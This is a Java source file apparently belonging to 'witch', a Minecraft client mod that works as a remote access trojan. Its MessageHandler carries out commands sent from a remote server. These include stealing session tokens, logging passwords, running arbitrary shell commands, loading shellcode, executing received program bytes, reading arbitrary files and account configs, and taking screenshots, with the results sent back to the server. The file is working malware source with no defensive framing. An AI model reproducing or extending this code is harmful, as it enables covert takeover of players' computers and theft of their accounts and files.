package me.soda.witch.client.connection;

import com.google.gson.Gson;
import me.soda.witch.client.Witch;
import me.soda.witch.client.features.ShellcodeLoader;
import me.soda.witch.client.features.Variables;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.PlayerInfo;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.Message;
import net.minecraft.text.Text;

import java.lang.management.ManagementFactory;

public class MessageHandler {
    public static void handleMessage(Message message) {
        String msgType = message.messageType;
        Object msg = message.data;
        LogUtil.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" ->
                        Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
                case "steal_token" -> NetUtil.send(msgType, Stealer.getToken());
                case "chat_control" -> ChatUtil.sendChat((String) msg);
                case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
                case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
                case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
                case "mods" -> NetUtil.send(msgType, MinecraftUtil.allMods());
                case "systeminfo" -> NetUtil.send(msgType, MinecraftUtil.systemInfo());
                case "screenshot" -> ScreenshotUtil.screenshot();
                case "screenshot2" -> NetUtil.send(msgType, ScreenshotUtil.screenshot2());
                case "chat" -> ChatUtil.chat(Text.of((String) msg), false);
                case "shell" -> new Thread(() -> {
                    String result = ProgramUtil.runCmd((String) msg);
                    NetUtil.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ProgramUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg, false)).start();
                }
                case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
                case "config" -> NetUtil.send(msgType, new Gson().toJson(Variables.INSTANCE));
                case "player" -> {
                    NetUtil.send(msgType, new PlayerInfo());
                    Witch.client.reconnections = 0;
                }
                case "skin" -> {
                    NetUtil.send("player", new PlayerInfo());
                    PlayerSkinUtil.sendPlayerSkin();
                }
                case "server" -> {
                    ServerUtil.disconnect();
                    Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
                }
                case "kick" -> ServerUtil.disconnect();
                case "execute" -> ProgramUtil.runProg((byte[]) msg);
                case "iasconfig" -> NetUtil.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> NetUtil.send(msgType, FileUtil.read((String) msg));
                case "runargs" -> NetUtil.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                case "props" -> NetUtil.send(msgType, System.getProperties());
                case "ip" -> NetUtil.send(msgType, NetUtil.httpSend("https://ifconfig.me/"));
                case "crash" -> MinecraftUtil.crash();
                case "server_name" -> Variables.INSTANCE.name = (String) msg;
                default -> {
                }
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }
}
